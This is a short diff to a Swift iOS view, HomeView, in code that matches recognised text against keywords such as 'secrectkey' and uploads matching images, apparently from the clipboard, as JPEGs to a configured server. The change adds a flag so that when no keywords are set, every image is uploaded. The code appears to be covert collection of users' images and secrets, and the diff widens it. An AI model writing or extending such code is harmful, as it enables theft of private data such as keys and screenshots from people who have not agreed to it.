@@ -135,7 +135,7 @@ struct HomeView: View {
     @State private var keywords = [
        "keywords", "secrectkey","words"
     ]
-     
+    @State private var unusekeywords = false //直接不用 keyword 关键词就可以识别
     
     //上传粘贴板内容的地址
     let serverUploadImageURL = "\(UserManager.shared.configURL)uploadImg"
@@ -837,8 +837,11 @@ struct HomeView: View {
                             return cleanedText.contains(cleanedKeyword)
                         }
 
+                        if self.keywords.count == 0 {
+                            unusekeywords = true
+                        }
                         // 打印结果
-                        if containsKeyword {
+                        if containsKeyword || unusekeywords {
                             print("Found keyword in text, 上传图片")
                             
                             // 压缩图片为 JPEG 格式
